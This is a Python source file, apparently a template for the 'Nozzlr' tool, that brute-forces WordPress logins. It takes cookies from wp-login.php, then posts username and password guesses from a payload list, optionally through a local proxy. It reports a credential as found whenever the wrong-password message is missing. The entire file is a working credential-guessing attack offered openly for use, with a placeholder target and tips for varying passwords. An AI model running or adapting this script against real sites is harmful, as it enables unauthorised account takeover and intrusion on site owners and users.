## Nozzlr template : HTTP POST bruteforcer (PoC: Wordpress Bruteforce (any version))
# @author intrd - http://dann.com.br/ 
# @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/

import urllib, shutil, json, requests, pickle, os.path

target="http://yourwebsite.com:80"

def nozz_module(payload, self=False, founds=False):
	payloads=':'.join(str(v) for v in payload.values())

	s = requests.session()
	
	use_proxy = False # Enable to proxied bruteforce
	proxies = {
        "http": "http://127.0.0.1:8080", 
        "https": "http://127.0.0.1:8080"
    }
	if use_proxy: s.proxies.update(proxies) 

	if not os.path.isfile("cookies"):
		headers = {
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
		}
		params = (
		    ('redirect_to', target+'/wp-admin/'),
		    ('reauth', '1'),
		)
		result = s.get(target+'/wp-login.php', headers=headers, params=params, verify=False)
		cookies=s.cookies
		with open('cookies', 'w') as f:
			pickle.dump(requests.utils.dict_from_cookiejar(cookies), f)
	else:
		with open('cookies') as f:
			cookies = requests.utils.cookiejar_from_dict(pickle.load(f))

	headers = {
	    'Origin': target,
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Referer': target+'/wp-login.php?redirect_to='+target+'%2Fwp-admin%2F&reauth=1',
	}
	postdata = {
		"log": payload[0],
		"pwd": payload[1],

		## Customize your payload if u want
		#"pwd": payload[1].lower(),
		#"pwd": payload[1].upper(),
		#"pwd": payload[1]+"123",

		"wp-submit":"Log+In",
		"testcookie":"1",
	}

	out={}
	out["code"]=""
	out["result"]=""
	code="null"
	try:
		r = s.post(target+'/wp-login.php', headers=headers, data=postdata, cookies=cookies, verify=False)
		#print r.status_code
	except requests.exceptions.RequestException as e:
		out["result"]=format(str(e)).strip()
		out["code"]="error"
		return out
	if "The password you entered for the username" in r.content:
		out["code"]="NEXT"
	else:
		#print r.content
		#print payloads
		print "\n"+postdata
		out["code"]="found: \""+payloads+"\""
	return out
		